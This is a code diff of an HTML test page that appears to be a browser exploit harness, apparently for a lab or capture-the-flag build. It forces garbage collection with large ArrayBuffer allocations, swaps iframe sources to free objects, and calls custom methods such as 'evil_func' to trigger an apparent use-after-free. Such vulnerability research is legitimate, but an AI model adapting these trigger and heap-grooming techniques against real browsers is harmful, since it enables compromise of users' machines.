@@ -1,50 +1,47 @@
-<!-- <script>
-var idd = null;
-function onl()
-{
-    idd = document.getElementById("idd");
-    idd.onload = null;
-    idd.src = 'http://127.0.0.1/exp.html'
-}
-function f()
-{
-    idd.onload = g;
-    idd.src = "http://127.0.0.1/tmp.html";
-}
-function g()
-{
-    idd.onload = null;
-    document.getElementById("cur").appendChild(document.createElement("a"));
-}
-</script>
-<body>
-<div id="cur"></div><br>
-index.html
-<iframe id="idd" onload="onl();"></iframe>
-</body> -->
-
+<head>
+<script src="test_proto.js"></script>
+</head>
+    
 <body>
 <iframe id="frame" src="http://127.0.0.1/tmp.html"></iframe>
 <br>
 <button onclick="trigger()">Trigger</button>
 <button onclick="query()">Query</button>
+<button onclick="alloc()">Alloc</button>
 <br>
 <p id="log">
 </p>
 <br>
 <script>
-let audioContext;
-let analyserNode;
-let worker;
+var audioContext;
+var analyserNode;
+var worker;
+var barrier;
+
+function MyObject() {
+    this.name = "Object";
+    this.scriptObject = {
+    	GetURL: "hahahaha",
+    }
+}
+
+function alloc() {
+    let tmp = new MyObject();
+    d = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+    analyserNode.angel_func(worker, d);
+}
 
 function gc() {
     for (let i = 0; i < 0x50; i++) { new ArrayBuffer(0x1000000); }
 }
 function trigger() {
-    document.getElementById("frame").src = "http://127.0.0.1/tmp2.html";
+    worker.GetURL();
+    // document.getElementById("frame").src = "http://127.0.0.1/tmp2.html";
     gc();
 }
 function query() {
+    gc();
+    barrier = createPluginReplacement();
     analyserNode.evil_func(worker);
 }
 
